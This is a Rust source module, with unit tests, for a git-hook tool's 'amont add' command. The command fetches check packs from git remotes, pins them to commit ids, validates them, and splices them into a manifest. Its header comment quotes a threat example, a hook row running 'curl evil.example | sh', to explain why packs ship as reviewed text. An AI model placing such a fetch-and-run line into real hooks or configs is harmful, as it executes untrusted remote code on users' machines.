//! Shipping a check — `amont add`.
//!
//! A check could always be WRITTEN in `amont.conf`; it could never be SHARED.
//! The only routes were pasting a line into somebody's manifest by hand, or
//! upstreaming it into amont itself.
//!
//! pre-commit solved this by cloning a repository and executing it, building an
//! isolated environment per hook. That is its slowest part and it is precisely
//! what [`crate::trust`] exists to refuse — that module's own test fixture
//! spells out the threat in one line:
//!
//! ```text
//! pre-commit  a  *  block  curl evil.example | sh
//! ```
//!
//! So what ships here is **text, not execution**. A pack is `amont.conf` syntax
//! and nothing else; `amont add` vendors those rows into your manifest; and
//! because the trust fingerprint is content-keyed over the whole file, the
//! append invalidates consent and a human must read every command before any of
//! them can run. The existing gate does the security work. This module only
//! saves the copy-paste.
//!
//! # Why git, and why that answers "verify against what?"
//!
//! amont links no crates (`scripts/check-no-deps.sh`), so it has no TLS and no
//! HTTP client, and must not grow one to fetch a config file. The only network
//! primitive it already uses is `git` — which turns out to be the right answer
//! rather than a consolation:
//!
//! - git is **content-addressed**. [`resolve`] turns a moving `@v2` into a
//!   commit id before anything is fetched, and [`fetch`] then refuses whatever
//!   it received unless it hashes to that id.
//! - the id, never the tag, is what gets written into `amont.conf`.
//! - SSH, HTTPS, private repositories and self-hosted forges all work already,
//!   with the user's own credentials and none of amont's.
//!
//! # Nothing here is on the commit path
//!
//! `amont add` is a setup verb. No hook calls into this module, nothing is
//! fetched between `git commit` and a verdict, and `a_pack_costs_the_commit_
//! path_nothing` asserts it.

use std::path::Path;

use crate::manifest::{Line, MANIFEST};

/// The file a pack repository must carry, at its root.
pub const PACK_FILE: &str = "amont.pack";

/// Where a pack came from, and which revision of it.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Source {
    /// How the user spelled it, minus the revision — what goes in the marker.
    pub label: String,
    /// What git is handed.
    pub url: String,
    /// `None` means the remote's default branch.
    pub rev: Option<String>,
}

/// Does this name a filesystem path rather than a shorthand?
///
/// A local path is how a pack is developed before it is published, and it is
/// the whole fixture story for the tests.
///
/// **Every shape is named explicitly, and `Path::is_absolute` is deliberately
/// not consulted.** It answers differently depending on where it runs, and this
/// function must not: `C:\pack` is not absolute on unix, and `/tmp/pack` is not
/// absolute on Windows, so a rule leaning on it rejects whichever shape is
/// foreign to the host. That cost two round trips through CI — first Windows
/// could not add a local pack at all, then, once `is_absolute` was added, it
/// refused the unix spelling instead. The lesson is that "is this a path" is a
/// question about the STRING, and the host's opinion of it is noise.
fn looks_like_path(body: &str) -> bool {
    let b = body.as_bytes();
    // `C:\pack` or `C:/pack`
    let drive = b.len() >= 3
        && b[0].is_ascii_alphabetic()
        && b[1] == b':'
        && (b[2] == b'\\' || b[2] == b'/');
    body.starts_with('/')            // unix absolute
        || drive
        || body.starts_with(r"\\")   // UNC: \\server\share
        || std::path::Path::new(body).exists() // a relative path that is really there
}

/// `github:owner/repo@v2`, `forgejo:host/owner/repo`, a git URL, or a local
/// path.
///
/// The revision is split on the last `@` that falls AFTER the last separator.
/// That rule is not decoration: `git@github.com:acme/repo.git` carries an `@`
/// in its userinfo, and splitting on the last `@` outright would read
/// `github.com` as a revision and quietly fetch the wrong thing. Both `/` and
/// `\` count, or a Windows path containing an `@` would lose its tail the same
/// way.
pub fn parse_source(spec: &str) -> Result<Source, String> {
    if spec.is_empty() {
        return Err("empty source".into());
    }
    let slash = spec.rfind(['/', '\\']).map(|i| i as isize).unwrap_or(-1);
    let (body, rev) = match spec.rfind('@') {
        Some(at) if (at as isize) > slash => (&spec[..at], Some(spec[at + 1..].to_string())),
        _ => (spec, None),
    };
    if rev.as_deref().is_some_and(str::is_empty) {
        return Err(format!("{spec}: a revision was named but is empty"));
    }
    let url = if let Some(rest) = body.strip_prefix("github:") {
        if rest.split('/').count() != 2 || rest.split('/').any(str::is_empty) {
            return Err(format!("{spec}: github: wants owner/repo"));
        }
        format!("https://github.com/{rest}.git")
    } else if let Some(rest) = body.strip_prefix("forgejo:") {
        // host/owner/repo — the host is not assumed, because a self-hosted
        // forge is the case this shorthand exists for.
        if rest.split('/').count() != 3 || rest.split('/').any(str::is_empty) {
            return Err(format!("{spec}: forgejo: wants host/owner/repo"));
        }
        format!("https://{rest}.git")
    } else if body.contains("://") || body.contains('@') || looks_like_path(body) {
        body.to_string()
    } else {
        return Err(format!(
            "{spec}: not a git URL — use github:owner/repo, \
             forgejo:host/owner/repo, or a full URL"
        ));
    };
    Ok(Source {
        label: body.to_string(),
        url,
        rev,
    })
}

/// The commit id `rev` names on the remote, before anything is downloaded.
pub fn resolve(source: &Source) -> Result<String, String> {
    let rev = source.rev.as_deref().unwrap_or("HEAD");
    let out = crate::git::stdout(&["ls-remote", &source.url, rev]).ok_or_else(|| {
        format!(
            "{}: cannot reach the remote, or {rev} names nothing",
            source.label
        )
    })?;
    // `ls-remote` prints "<sha>\t<ref>" per match. A rev matching several refs
    // (a tag and a branch of the same name) is ambiguous, and guessing which
    // one the user meant is exactly the wrong instinct for a verb that installs
    // commands.
    let ids: Vec<&str> = out
        .lines()
        .filter_map(|l| l.split_whitespace().next())
        .collect();
    match ids.as_slice() {
        [] => Err(format!(
            "{}: {rev} names nothing on that remote",
            source.label
        )),
        [one] => Ok((*one).to_string()),
        many => Err(format!(
            "{}: {rev} is ambiguous — it matches {} refs on that remote; \
             name a commit id instead",
            source.label,
            many.len()
        )),
    }
}

/// The pack's text at `id`, or an error.
///
/// Fetches the REF and then checks what arrived hashes to the id [`resolve`]
/// already agreed with the remote. Fetching the bare id would be more direct
/// and is not universally allowed (`uploadpack.allowAnySHA1InWant`); this way
/// works against every server and still detects a ref that moved underneath us
/// between the two calls.
pub fn fetch(source: &Source, id: &str, into: &Path) -> Result<String, String> {
    let dir = into.to_string_lossy().into_owned();
    let ok = |args: &[&str]| crate::git::succeeds_in(into, args);
    std::fs::create_dir_all(into).map_err(|e| format!("cannot create {dir}: {e}"))?;
    if !ok(&["init", "-q"]) {
        return Err(format!("cannot init a scratch repository at {dir}"));
    }
    let rev = source.rev.as_deref().unwrap_or("HEAD");
    if !ok(&["fetch", "-q", "--depth", "1", &source.url, rev]) {
        return Err(format!("{}: fetching {rev} failed", source.label));
    }
    let got = crate::git::stdout_in(into, &["rev-parse", "FETCH_HEAD"])
        .ok_or_else(|| format!("{}: nothing was fetched", source.label))?;
    if got != id {
        return Err(format!(
            "{}: {rev} moved while we were reading it ({id} → {got}) — \
             nothing was written; run the same command again",
            source.label
        ));
    }
    crate::git::stdout_in(into, &["show", &format!("FETCH_HEAD:{PACK_FILE}")]).ok_or_else(|| {
        format!(
            "{}: has no {PACK_FILE} at {}",
            source.label,
            &id[..7.min(id.len())]
        )
    })
}

/// The rows a pack may contribute, verbatim, or a refusal naming the first
/// thing wrong with it.
///
/// Validated with the REAL parser ([`crate::manifest::parse_lines`]) rather
/// than a second one that could disagree with it — a pack that parses here and
/// not there would be a manifest nobody intended. The original text of each row
/// is what gets written, so nothing round-trips through a formatter that might
/// render it differently from how it was reviewed.
///
/// Refused **whole**, never partially: a half-applied pack leaves an
/// `amont.conf` that neither the author nor the user asked for.
pub fn rows(text: &str) -> Result<Vec<String>, String> {
    // The same lines `parse_lines` will keep, in the same order, so the two can
    // be zipped without either needing to report a line number.
    let source_rows: Vec<&str> = text
        .lines()
        .map(str::trim)
        .filter(|l| !l.is_empty() && !l.starts_with('#'))
        .collect();
    let parsed = crate::manifest::parse_lines(text);
    if parsed.len() != source_rows.len() {
        return Err(format!("{PACK_FILE}: cannot be read as {MANIFEST} syntax"));
    }
    if source_rows.is_empty() {
        return Err(format!("{PACK_FILE}: declares no checks"));
    }
    let mut out = Vec::with_capacity(source_rows.len());
    for (line, parsed) in source_rows.iter().zip(&parsed) {
        match parsed {
            Line::Usable(_) => out.push((*line).to_string()),
            Line::Broken { why, .. } => {
                return Err(format!("{PACK_FILE}: `{line}` — {why}"));
            }
            // A pack carries CHECKS. `tool`, `severity`, `skip` and `set` are
            // policy about the repository installing it, and
            // docs/custom-checks.md ("What a repository cannot do") keeps those
            // local on purpose — a `set` line reaching `amont.fix` would let a
            // third party turn on rewriting somebody's working tree.
            Line::Tool(_) | Line::Policy { .. } => {
                return Err(format!(
                    "{PACK_FILE}: `{line}` — a pack may declare checks only, \
                     not tool pins or policy"
                ));
            }
        }
    }
    Ok(out)
}

/// The block a pack owns inside `amont.conf`.
///
/// Markers so a re-`add` REPLACES rather than appends — a second copy of the
/// same declaration is refused by the duplicate-id rule, so appending blindly
/// would break the manifest on the second run — and so a human can remove a
/// pack by deleting a block. `#` keeps them invisible to the parser, which
/// skips comments.
fn start_marker(label: &str) -> String {
    format!("# amont:pack:start {label}")
}
fn end_marker(label: &str) -> String {
    format!("# amont:pack:end {label}")
}

pub fn block(label: &str, id: &str, rows: &[String]) -> String {
    let mut out = format!("{} {id}\n", start_marker(label));
    for r in rows {
        out.push_str(r);
        out.push('\n');
    }
    out.push_str(&end_marker(label));
    out.push('\n');
    out
}

/// `manifest` with this source's block replaced, or appended if it has none.
///
/// Markers are searched INDEPENDENTLY, like `agents_md::block_range` does, so a
/// file carrying one without the other is reported rather than silently
/// half-rewritten.
pub fn splice(manifest: &str, label: &str, id: &str, rows: &[String]) -> Result<String, String> {
    let (start, end) = (start_marker(label), end_marker(label));
    let at_start = manifest.find(&start);
    let at_end = manifest.find(&end);
    let fresh = block(label, id, rows);
    match (at_start, at_end) {
        (Some(s), Some(e)) if e > s => {
            let mut tail = e + end.len();
            if manifest[tail..].starts_with('\n') {
                tail += 1;
            }
            Ok(format!("{}{fresh}{}", &manifest[..s], &manifest[tail..]))
        }
        (None, None) => {
            let mut out = manifest.to_string();
            if !out.is_empty() && !out.ends_with('\n') {
                out.push('\n');
            }
            if !out.is_empty() {
                out.push('\n');
            }
            out.push_str(&fresh);
            Ok(out)
        }
        _ => Err(format!(
            "{MANIFEST}: has an unpaired `amont:pack` marker for {label} — \
             fix or remove it by hand"
        )),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn shorthands_and_urls_become_git_urls() {
        let s = parse_source("github:acme/rust-strict").unwrap();
        assert_eq!(s.url, "https://github.com/acme/rust-strict.git");
        assert_eq!(s.label, "github:acme/rust-strict");
        assert_eq!(s.rev, None);

        let s = parse_source("forgejo:git.example.org/acme/packs@v2").unwrap();
        assert_eq!(s.url, "https://git.example.org/acme/packs.git");
        assert_eq!(s.rev.as_deref(), Some("v2"));
    }

    /// The `@` in `git@host` is userinfo, not a revision. Splitting on the last
    /// `@` outright would read the host as a revision and fetch the wrong
    /// thing — silently, since `ls-remote` would simply find nothing.
    #[test]
    fn an_ssh_url_keeps_its_userinfo() {
        let s = parse_source("git@github.com:acme/repo.git").unwrap();
        assert_eq!(s.url, "git@github.com:acme/repo.git");
        assert_eq!(s.rev, None);

        let s = parse_source("git@github.com:acme/repo.git@v1").unwrap();
        assert_eq!(s.url, "git@github.com:acme/repo.git");
        assert_eq!(s.rev.as_deref(), Some("v1"));
    }

    /// A local path is a valid source on every platform, and BOTH spellings are
    /// accepted wherever this runs.
    ///
    /// Two CI round trips are behind this test. First the rule was
    /// `starts_with('/')` — true of a unix path, false of every Windows one, so
    /// the feature was silently unix-only. Then it became `Path::is_absolute`,
    /// which is platform-dependent in the other direction and refused
    /// `/tmp/pack` on Windows. Asserting both shapes on every host is what
    /// makes the third version stay fixed.
    #[test]
    fn an_absolute_path_is_a_source_on_any_platform() {
        for p in ["/tmp/pack", r"C:\Users\me\pack", r"\\server\share\pack"] {
            let s = parse_source(p).unwrap_or_else(|e| panic!("{p:?} should be a source: {e}"));
            assert_eq!(s.url, p);
            assert_eq!(s.rev, None, "{p:?} has no revision");
        }
    }

    /// And a Windows path carrying an `@` keeps it: the separator search has to
    /// know about `\` or the tail is read as a revision.
    #[test]
    fn a_windows_path_with_an_at_sign_is_not_split_on_it() {
        let s = parse_source(r"C:\Users\me\a@b\pack").unwrap();
        assert_eq!(s.url, r"C:\Users\me\a@b\pack");
        assert_eq!(s.rev, None);
        let s = parse_source(r"C:\Users\me\a@b\pack@v1").unwrap();
        assert_eq!(s.url, r"C:\Users\me\a@b\pack");
        assert_eq!(s.rev.as_deref(), Some("v1"));
    }

    #[test]
    fn a_source_that_is_not_a_url_is_refused() {
        for bad in ["", "acme/rust-strict", "github:acme", "github:acme/repo/x"] {
            assert!(parse_source(bad).is_err(), "{bad:?} should be refused");
        }
        assert!(parse_source("github:acme/repo@").is_err(), "empty revision");
    }

    #[test]
    fn rows_are_taken_verbatim() {
        let text = "# a comment\n\npre-commit  terraform-fmt  Dockerfile  block  terraform-fmt\n";
        assert_eq!(
            rows(text).unwrap(),
            vec!["pre-commit  terraform-fmt  Dockerfile  block  terraform-fmt"]
        );
    }

    /// Policy is about the repository INSTALLING the pack, and a third party
    /// must not reach it: `severity` could quietly downgrade the secrets scan,
    /// `skip` could silence it outright, and a `set` could raise the large-file
    /// ceiling on somebody else's repository.
    ///
    /// These are all lines the parser accepts as VALID policy — which is the
    /// point. Refusing them is this module's own rule, not something the
    /// manifest parser was already doing.
    #[test]
    fn a_pack_may_not_carry_valid_policy_or_pins() {
        for bad in [
            "set  largeFileBlock  4000\n",
            "severity  secrets  warn\n",
            "skip  secrets\n",
            "tool  terraform-fmt  2.12\n",
        ] {
            let text = format!("pre-commit  ok  *  block  true\n{bad}");
            let err = rows(&text).unwrap_err();
            assert!(err.contains("checks only"), "{bad:?} gave: {err}");
        }
    }

    /// And a line the parser cannot read at all is refused too — by the other
    /// arm, with the parser's own reason rather than a guess at one.
    #[test]
    fn a_policy_line_the_parser_rejects_is_still_refused() {
        let text = "pre-commit  ok  *  block  true\nset  amont.fix  true\n";
        let err = rows(text).unwrap_err();
        assert!(err.contains("not a policy-settable key"), "{err}");
    }

    #[test]
    fn a_pack_is_refused_whole_on_one_bad_row() {
        let text = "pre-commit  fine  *  block  true\nnonsense\n";
        assert!(rows(text).is_err());
        assert!(rows("# nothing but a comment\n").is_err(), "empty pack");
    }

    #[test]
    fn splice_appends_then_replaces_in_place() {
        let rows0 = vec!["pre-commit  a  *  block  true".to_string()];
        let base = "pre-commit  mine  *  block  true\n";

        let once = splice(base, "github:acme/p", "abc1234", &rows0).unwrap();
        assert!(once.starts_with(base), "existing lines are kept: {once:?}");
        assert!(once.contains("# amont:pack:start github:acme/p abc1234"));

        // A second add of the same source must REPLACE: two copies of one
        // declaration is a duplicate id, which the parser refuses outright.
        let rows1 = vec!["pre-commit  b  *  block  true".to_string()];
        let twice = splice(&once, "github:acme/p", "def5678", &rows1).unwrap();
        assert_eq!(twice.matches("amont:pack:start github:acme/p").count(), 1);
        assert!(twice.contains("def5678"));
        assert!(!twice.contains("abc1234"));
        assert!(!twice.contains("pre-commit  a  *"), "old rows are gone");
        assert!(
            twice.contains("pre-commit  mine"),
            "unrelated lines survive"
        );
    }

    #[test]
    fn an_unpaired_marker_is_reported_not_guessed() {
        let rows0 = vec!["pre-commit  a  *  block  true".to_string()];
        let half = "# amont:pack:start github:acme/p abc1234\n";
        assert!(splice(half, "github:acme/p", "x", &rows0).is_err());
        let inverted = "# amont:pack:end github:acme/p\n# amont:pack:start github:acme/p x\n";
        assert!(splice(inverted, "github:acme/p", "y", &rows0).is_err());
    }

    /// Two packs coexist without either disturbing the other's block.
    #[test]
    fn packs_from_different_sources_do_not_collide() {
        let a = vec!["pre-commit  a  *  block  true".to_string()];
        let b = vec!["pre-commit  b  *  block  true".to_string()];
        let one = splice("", "github:x/a", "1111111", &a).unwrap();
        let two = splice(&one, "github:x/b", "2222222", &b).unwrap();
        let three = splice(&two, "github:x/a", "3333333", &a).unwrap();
        assert!(three.contains("2222222"), "the other pack is untouched");
        assert!(three.contains("3333333"));
        assert!(!three.contains("1111111"));
    }
}
